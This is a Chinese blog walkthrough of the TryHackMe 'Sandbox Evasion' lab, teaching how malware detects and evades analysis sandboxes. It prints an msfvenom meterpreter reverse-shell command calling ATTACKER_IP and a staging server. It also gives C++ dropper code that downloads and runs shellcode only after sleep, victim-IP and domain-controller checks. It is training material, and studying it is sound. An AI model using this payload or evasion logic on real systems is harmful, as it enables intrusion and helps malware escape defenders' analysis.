1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/TryHackMe/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>TryHackMe</span></a></span></div></div><h1 class="post-title" itemprop="name headline">THM-沙盒规避</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-08-21T12:37:04.032Z" title="更新于 2024-08-21 20:37:04">2024-08-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">7.1k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>25分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="THM-沙盒规避"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/08/21/thm-sha-he-gui-bi/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/08/21/thm-sha-he-gui-bi/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/08/21/thm-sha-he-gui-bi/"><header><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a><a href="/tags/TryHackMe/" tabindex="-1" itemprop="url">TryHackMe</a><h1 id="CrawlerTitle" itemprop="name headline">THM-沙盒规避</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time><time itemprop="dateCreated datePublished" datetime="2024-08-21T12:37:04.032Z" title="更新于 2024-08-21 20:37:04">2024-08-21</time></header><p>了解蓝队人员可以部署的主动防御机制，以识别其环境中的对手。</p>
<h1 id="0x01-介绍">0x01 介绍</h1>
<p>欢迎来到沙盒规避</p>
<p>Lots of companies deploy a “Defense in Depth” strategy, which refers to implementing security in layers, so if one layer fails, there should be another one that an adversary must evade. In this room, we will be focusing on one unique type of active defense; Sandboxes. Sandboxes provide a safe way to analyze a potentially malicious file and observe the effects on the system and return if the executable is malicious or not.<br>
许多公司部署了“纵深防御”策略，即分层实施安全性，因此如果一层失败，对手就必须躲避另一层。在这个房间里，我们将重点讨论一种独特的主动防御类型；沙箱。沙箱提供了一种安全的方法来分析潜在的恶意文件并观察对系统的影响，并返回可执行文件是否恶意。</p>
<h2 id="学习目标">学习目标</h2>
<p>在这个房间里，我们将深入了解沙箱；当您完成本课程时，您将对以下主题有更好的理解：</p>
<ul>
<li>了解恶意软件沙箱的工作原理</li>
<li>了解静态和动态恶意软件分析</li>
<li>常见的沙箱规避方法</li>
<li>使用 Any.Run 开发和测试沙箱规避方法</li>
</ul>
<h2 id="房间先决条件">房间先决条件</h2>
<p>对于此房间，我们建议您具有以下方面的经验：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/abusingwindowsinternals">Windows APIs</a></li>
<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/windowsinternals">C++ Programming</a></li>
<li><a target="_blank" rel="noopener" href="https://tryhackme.com/room/activedirectorybasics">Active Directory </a></li>
</ul>
<h1 id="0x02-敌人陷入-sandbox">0x02 敌人陷入 Sandbox</h1>
<h2 id="什么是恶意软件分析">什么是恶意软件分析</h2>
<p>恶意软件分析是分析可疑文件的过程，以确定它在微观层面（通过查看程序集）和宏观层面（通过查看它在系统上的行为）的行为。此过程使蓝队成员可以更好地了解恶意程序，这可以帮助他们开发检测。</p>
<h2 id="静态与动态分析">静态与动态分析</h2>
<p>蓝队成员可以通过两种方式分析可疑文件；一种方法是使用 IDA 或Ghidra等反汇编程序在微观层面上查看代码（如前所述）。这个过程被称为“静态分析”。</p>
<p>另一方面，我们可以通过称为“动态分析”的过程观察可疑文件在系统上执行时会发生什么。系统上通常会安装许多分析工具，例如EDR Software、 Sysmon 、ProcMon、Process Hacker 和调试器（例如 OllyDebug、WinDbg、x64Dbg）等等。</p>
<h2 id="沙盒简介">沙盒简介</h2>
<p>蓝队成员提出的分析可疑文件的最有创意和最有效的方法之一是动态分析。此方法涉及在容器化（或虚拟化）环境中运行文件；该环境称为沙箱。根据选择的沙箱，您可以自定义运行的 Windows 版本、计算机上安装的软件等等。</p>
<p>沙箱提供了一种安全有效的方法来监视可疑文件在生产系统上运行（或允许将其发送到生产系统）之前的行为。网络的各个部分可能存在许多商业沙箱。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408212035205.png" alt="image-20240821175029963"></p>
<p>在上图中，存在三个不同的沙箱。在企业环境中存在一个、两个甚至三个沙箱的情况并不少见。通常您可能会在以下位置找到它们：</p>
<ul>
<li>Firewalls 防火墙</li>
<li>Mail Servers 邮件服务器</li>
<li>Workstations 工作站</li>
</ul>
<p>每个沙箱的工作方式可能不同；例如，防火墙可以执行电子邮件中的附件并查看发生何种类型的网络通信，而邮件沙箱可以打开电子邮件并查看电子邮件中的嵌入文件是否触发通过SMB等协议进行下载，以尝试窃取 NetNTLM 哈希值，基于主机的防病毒沙箱可以在其中执行该文件并监视恶意编程行为或对系统的更改。</p>
<p>有许多供应商生产各种沙盒产品，蓝队成员可以将其部署在企业网络中。以下是一些流行的例子：</p>
<ul>
<li>Palo Alto Wildfire (<a target="_blank" rel="noopener" href="https://www.paloaltonetworks.co.uk/products/secure-the-network/wildfire">Firewall</a>)</li>
<li>Proofpoint TAP (<a target="_blank" rel="noopener" href="https://www.proofpoint.com/uk/products/advanced-threat-protection/targeted-attack-protection">Email Sandbox</a>)<br>
Proofpoint TAP（<a target="_blank" rel="noopener" href="https://www.proofpoint.com/uk/products/advanced-threat-protection/targeted-attack-protection">电子邮件沙箱</a>）</li>
<li>Falcon Sandbox（ <a target="_blank" rel="noopener" href="https://www.crowdstrike.co.uk/products/threat-intelligence/falcon-sandbox-malware-analysis/">EDR /工作站</a>）</li>
<li>MimeCast（<a target="_blank" rel="noopener" href="https://www.mimecast.com/">电子邮件沙箱</a>）</li>
<li>VirusTotal（<a target="_blank" rel="noopener" href="https://www.virustotal.com/">样本提交网站</a>）</li>
<li>Any.Run（<a target="_blank" rel="noopener" href="https://any.run/">样本提交网站</a>）</li>
<li><a target="_blank" rel="noopener" href="http://Antiscan.me">Antiscan.me</a>（<a target="_blank" rel="noopener" href="https://antiscan.me/">样本提交网站</a>）</li>
<li>Joe Sandbox（<a target="_blank" rel="noopener" href="https://www.joesandbox.com/">样本提交网站</a>）</li>
</ul>
<p>在下一节中，我们将了解恶意软件作者通常部署的各种技术，以了解现有的一些规避技术。</p>
<p>我们提供了一个 Windows 开发虚拟机，您可以在其中开发自己的沙盒规避技术。您可以使用以下凭据访问虚拟机：</p>
<p><strong>Username:</strong> Administrator，<strong>Password:</strong> TryHackMe123!</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408212035206.png" alt="image-20240821175503407"></p>
<h1 id="0x03-常见-sandbox-规避技术">0x03 常见 Sandbox 规避技术</h1>
<h2 id="沙盒规避简介">沙盒规避简介</h2>
<p>现在您已经大致了解了什么是恶意软件沙箱，我们可以继续学习一些高层次的规避技术。我们将其分为四个不同的类别；在下一个任务中，我们将实施四种不同的规避技术（每个类别一种），因此您可以在离开这个房间时掌握一些实用知识来帮助您的红队行动。</p>
<p>我们将涵盖以下四大类：</p>
<ul>
<li>Sleeping through Sandboxes：在Sandbox睡眠</li>
<li>Geolocation and Geoblocking：地理定位和地理封锁</li>
<li>Checking System Information：查看系统信息</li>
<li>Querying Network Information：查询网络信息</li>
</ul>
<p>这些技术按从最基本的技术到最先进的顺序排列。让我们开始吧。</p>
<h2 id="sandbox睡眠">Sandbox睡眠</h2>
<p>恶意软件沙箱通常会受到时间限制，以防止资源过度分配，这可能会急剧增加沙箱队列。这是我们可以滥用的一个重要方面；如果我们知道沙箱在任何给定时间只会运行五分钟，我们可以实现一个睡眠计时器，在执行 shellcode 之前睡眠五分钟。这可以通过多种方式完成；一种常见的方法是查询当前系统时间，并在并行线程中检查并查看已经过去了多少时间。五分钟过去后，我们的程序就可以开始正常执行了。</p>
<p>另一种流行的方法是进行复杂的、计算量大的数学运算，这可能需要一定的时间 - 例如，计算斐波那契数列达到给定的数字。请记住，根据系统的硬件，执行此操作可能需要或多或少的时间。屏蔽您的应用程序通常是避免反病毒检测的好主意，因此这应该已经包含在您的工具包中。</p>
<p>请注意，某些沙箱可能会改变内置的睡眠功能；各种反病毒供应商都发表了有关绕过内置睡眠功能的博客文章。所以强烈建议您开发自己的睡眠功能。以下是一些关于绕过睡眠功能的博客文章：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://evasions.checkpoint.com/src/Evasions/techniques/timing.html">https://evasions.checkpoint.com/src/Evasions/techniques/timing.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.joesecurity.org/blog/660946897093663167">https://www.joesecurity.org/blog/660946897093663167</a></li>
</ul>
<h2 id="地理定位">地理定位</h2>
<p>沙箱的一个决定性因素是它们通常位于外部并由反病毒提供商托管。如果您知道自己正在攻击 TryHackMe（一家欧洲公司），并且您的二进制文件是在加利福尼亚州执行的，那么您可以做出有根据的猜测，该二进制文件最终进入了沙箱。您可以选择在程序上实施地理位置过滤器，检查 IP 地址块是否属于您所定位的公司所有，或者是否来自住宅地址空间。您可以使用多种服务来检查此信息：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://ifconfig.me/">ifconfig.me</a></li>
<li><a target="_blank" rel="noopener" href="https://rdap.arin.net/registry/ip/1.1.1.1">https://rdap.arin.net/registry/ip/1.1.1.1</a></li>
</ul>
<p><a target="_blank" rel="noopener" href="http://IfConfig.me">IfConfig.me</a> 可用于检索您当前的 IP 地址，其他信息是可选的。将此与 ARIN 的 RDAP 相结合，您可以确定以易于解析的格式 ( JSON ) 返回的 ISP。</p>
<p>需要注意的是，此方法仅在主机可以访问互联网的情况下才有效。某些组织可能会构建特定域的阻止列表，因此您应该 100% 确定此方法适用于您尝试利用此方法的组织。</p>
<h2 id="查看系统信息">查看系统信息</h2>
<p>另一种非常流行的方法是观察系统信息。大多数沙箱的资源通常会减少。流行的恶意软件沙盒服务 Any.Run 仅为每个虚拟机分配 1 个CPU核心和 4GB RAM ：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408212035207.png" alt="image-20240821180151661"></p>
<p>网络中的大多数工作站通常具有 2-8 个CPU内核、8-32GB RAM 和 256GB-1TB+ 驱动器空间。这很大程度上取决于您所针对的组织，但一般来说，您可以期望每个系统有超过 2 个CPU核心和超过 4GB 的 RAM。了解这一点后，我们可以定制代码来查询基本系统信息（ CPU核心数、 RAM数量、磁盘大小等）。</p>
<p>这绝不是一个详尽的列表，但这里有一些您可以过滤的其他示例：</p>
<ul>
<li>存储介质序列号</li>
<li>电脑主机名</li>
<li>BIOS / UEFI版本/序列号</li>
<li>Windows 产品密钥/操作系统版本</li>
<li>网络适​​配器信息</li>
<li>虚拟化检查</li>
<li>当前登录用户</li>
<li>还有更多！</li>
</ul>
<h2 id="查询网络信息">查询网络信息</h2>
<p>最后一种方法是我们将要介绍的最开放的方法。由于其开放性，它被认为是更高级的方法之一，因为它涉及查询有关 Active Directory 域的信息。</p>
<p>几乎没有恶意软件沙箱加入域中，因此可以相对安全地假设如果计算机未加入域，则它不是正确的目标！但是，您不能总是太确定，因此您应该收集一些有关域的信息以确保安全。您可以查询的对象有很多；以下是一些需要考虑的因素：</p>
<ul>
<li>Computers 计算机</li>
<li>User accounts 用户帐户</li>
<li>Last User Login(s) 最后用户登录</li>
<li>Groups 组</li>
<li>Domain Admins 域管理员</li>
<li>Enterprise Admins 企业管理员</li>
<li>Domain Controllers 域控制器</li>
<li>Service Accounts 服务账户</li>
<li>DNS Servers 域名服务器</li>
</ul>
<p>这些技术的难度各不相同；因此，您应该考虑要花费多少时间和精力来构建这些规避方法。一个简单的方法，例如检查 LogonServer、LogonUserSid 或 LogonDomain 等项目的系统环境变量（这可以使用<strong>echo %VARIABLE%<strong>完成，或者显示所有变量，使用</strong>set</strong>命令）可能比实现Windows API 。</p>
<h2 id="搭建舞台">搭建舞台</h2>
<p>现在您已经更好地了解了存在哪些沙盒绕过方法类型，我们将进入下一步并在下一个任务中实现一些沙盒绕过。</p>
<p>在继续下一个任务之前，我们将从一个基本的 dropper 开始，它从 Web 服务器（特别是 /index.raw）检索 shellcode，并将其注入内存，然后执行 shellcode。需要注意的是，所有 shellcode 都必须使用 MSFVenom 以原始格式生成，并且必须是 64 位，而不是 32 位。可以使用以下命令生成。</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@attack-box</span>$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=<span class="hljs-number">1337</span> -f raw -o index.raw
[-] No platform was selected, choosing <span class="hljs-attribute">Msf</span>::<span class="hljs-attribute">Module</span>::<span class="hljs-attribute">Platform</span>::Windows from the payload
[-] No arch selected, selecting <span class="hljs-attribute">arch</span>: x64 from the payload
No encoder specified, outputting raw payload
Payload <span class="hljs-attribute">size</span>: <span class="hljs-number">510</span> bytes
Saved <span class="hljs-attribute">as</span>: index.raw
user<span class="hljs-keyword">@attack-box</span>$ python3 -m http.server <span class="hljs-number">8080</span>
Serving HTTP on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> port <span class="hljs-number">80</span> (<span class="hljs-attribute">http</span>://<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">80</span>/) ...
<span class="hljs-number">10.10</span>.<span class="hljs-number">14.212</span> - - [<span class="hljs-number">20</span>/Mar/<span class="hljs-number">2022</span> <span class="hljs-number">22</span>:<span class="hljs-number">04</span>:<span class="hljs-number">22</span>] <span class="hljs-string">"GET /index.raw HTTP/1.1"</span> <span class="hljs-number">200</span> -</code></pre>
<p>然后，shellcode 应通过任何 HTTP 服务器托管在 AttackBox 上。 Python3 的 http.server 模块具有高度可移植性和灵活性，将作为此任务的良好基础。在现实世界中，您可以将 shellcode 托管在C2服务器上。出于本实验的目的，我们将使用没有C2服务器的 Attackbox。</p>
<p>此任务附加的代码已使用 Visual Studio 2019（或更高版本）进行测试和编译。下载 dropper.cpp 并打开它。请务必注意，第 16、22、24、27 和 33 行中有多个占位符值，您必须更新这些占位符值才能使代码正常运行。更改这些值后，编译 64 位版本的代码。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408212035208.png" alt="image-20240821180804095"></p>
<h1 id="0x04-执行各种规避技术">0x04 执行各种规避技术</h1>
<h2 id="深入研究沙盒规避">深入研究沙盒规避</h2>
<p>获取此基本代码后，我们将迈出进入沙盒规避世界的第一步。我们将从睡眠开始，因为这是最简单的。</p>
<h2 id="taking-a-nap">Taking a Nap</h2>
<p>我们可以从上一个任务中获取模板代码，并向其中添加一条 120,000MS 的 Sleep 语句。这相当于大约 120 秒或 2 分钟。一般来说，您需要接近 5 分钟的时间才能确定；不过，对于测试目的来说，2 分钟就足够了。我们现在将在主函数中添加 Sleep 语句：</p>
<pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">if</span> (isDomainController == TRUE) {
        <span class="hljs-built_in">downloadAndExecute</span>();
    } <span class="hljs-keyword">else</span> {
        cout &lt;&lt; <span class="hljs-string">"Domain Controller Not Found!"</span>;
    }
}</code></pre>
<p>完成此操作后，我们可以编译代码并将其上传到<a target="_blank" rel="noopener" href="http://any.run/">Any.Run</a> 。您可以阅读以下测试，并通过链接查看它们在<a target="_blank" rel="noopener" href="http://any.run/">Any.Run</a>上的行为。这将作为我们沙盒规避的测试场，因为它为我们提供了非常详细的信息。回顾两次运行：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://app.any.run/tasks/0799e9b3-dddc-4838-ba2d-c95fc0a7e63b">Sleep Bypass</a></li>
<li><a target="_blank" rel="noopener" href="https://app.any.run/tasks/ad3cf5b4-1bdf-4005-8578-507334f5c8ac">No Sleep Bypass</a></li>
</ul>
<p>并排查看两个结果，我们注意到 Sleepy 运行中没有发生任何活动。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408212035209.png" alt="image-20240821181354571"></p>
<p>在我们的非休眠运行中，我们可以看到HTTP请求发送到 Cloudflare。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408212035210.png" alt="image-20240821182727991"></p>
<p>恭喜！我们已经成功创建了第一个沙盒规避技术。虽然这是一项简单的技术，但它的功能却非常强大，使我们能够用完 Any.Run 的一分钟计时器。正如上一个任务中所述，此方法可能有效，也可能无效，因为已发布的各种博客文章显示蓝队可以创建睡眠计时器旁路。更好的实现方式是通过大量的数学运算来浪费计算时间。</p>
<h2 id="地理位置过滤">地理位置过滤</h2>
<p>转向我们在沙箱上逃避 shellcode 执行的下一个方法，我们将利用地理位置块。幸运的是，我们将能够利用大量已经为我们编写的代码。为此可以重复使用“downloadAndExecute()”函数的部分内容。我们将重用以下组件：</p>
<ul>
<li>网站 URL（以前的 c2URL 变量）</li>
<li>Internet Stream（以前的流变量）</li>
<li>字符串变量（以前的 s 变量）</li>
<li>缓冲区空间（以前称为 Buffer 变量）</li>
<li>读取字节数（以前称为 unsigned long bytesRead 变量）</li>
<li>最后， <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775127(v=vs.85)">URLOpenBlockingStreamA</a>函数</li>
</ul>
<p><strong>将其集成到我们的代码中</strong></p>
<p>这转化为一个看起来像这样的实际函数：</p>
<pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">checkIP</span><span class="hljs-params">()</span> </span>{   
 <span class="hljs-comment">// Declare the Website URL that we would like to vicit</span>
    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* websiteURL = <span class="hljs-string">"&lt;https://ifconfig.me/ip&gt;"</span>;   
 <span class="hljs-comment">// Create an Internet Stream to access the website</span>
    IStream* stream;   
 <span class="hljs-comment">// Create a string variable where we will store the string data received from the website</span>
    string s;   
  <span class="hljs-comment">// Create a space in memory where we will store our IP Address</span>
    <span class="hljs-type">char</span> buff[<span class="hljs-number">35</span>];   
    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> bytesRead;   
 <span class="hljs-comment">// Open an Internet stream to the remote website</span>
    <span class="hljs-built_in">URLOpenBlockingStreamA</span>(<span class="hljs-number">0</span>, websiteURL, &amp;stream, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);   
 <span class="hljs-comment">// While data is being sent from the webserver, write it to memory</span>
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {       
        stream-&gt;<span class="hljs-built_in">Read</span>(buff, <span class="hljs-number">35</span>, &amp;bytesRead);       
        <span class="hljs-keyword">if</span> (<span class="hljs-number">0U</span> == bytesRead) {           
            <span class="hljs-keyword">break</span>;       
        }       
        s.<span class="hljs-built_in">append</span>(buff, bytesRead);   
    }   
  <span class="hljs-comment">// Compare if the string is equal to the targeted victim's IP. If true, return the check is successful. Else, fail the check.</span>
    <span class="hljs-keyword">if</span> (s == <span class="hljs-string">"VICTIM_IP"</span>) {       
        <span class="hljs-keyword">return</span> TRUE;   
    }   
    <span class="hljs-keyword">else</span> {       
    <span class="hljs-keyword">return</span> FALSE;   
    }
}</code></pre>
<p>该代码可以分为以下步骤：</p>
<ol>
<li>声明上面提到的所需变量。</li>
<li>使用 URLOpenBlockingStreamA 函数打开 <a target="_blank" rel="noopener" href="http://ifconfig.me/ip">ifconfig.me/ip</a> 的互联网流以检查当前的 IP 地址。</li>
<li>将URLOpenBlockingStreamA函数返回的数据流写入内存。</li>
<li>将内存缓冲区中的数据附加到字符串变量。</li>
<li>检查字符串数据是否等于受害者的 IP 地址。</li>
<li>如果为 True，则返回 TRUE；如果为 False，则返回 FALSE。</li>
</ol>
<p>现在我们必须修改我们的 main 函数，以便我们可以利用新创建的函数：</p>
<pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">checkIP</span>() == TRUE){
        <span class="hljs-built_in">downloadAndExecute</span>();
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
    <span class="hljs-keyword">else</span> {
        cout &lt;&lt; <span class="hljs-string">"HTTP/418 - I'm a Teapot!"</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
}</code></pre>
<p>上面的代码调用新函数 checkIP()，如果 IP 地址返回 TRUE，则调用 downloadAndExecute() 函数从我们的 C2 服务器调用 shellcode。如果为 FALSE，则返回 HTTP/418 - 我是一个茶壶！”。</p>
<p><strong>Testing Our Code 测试我们的代码</strong></p>
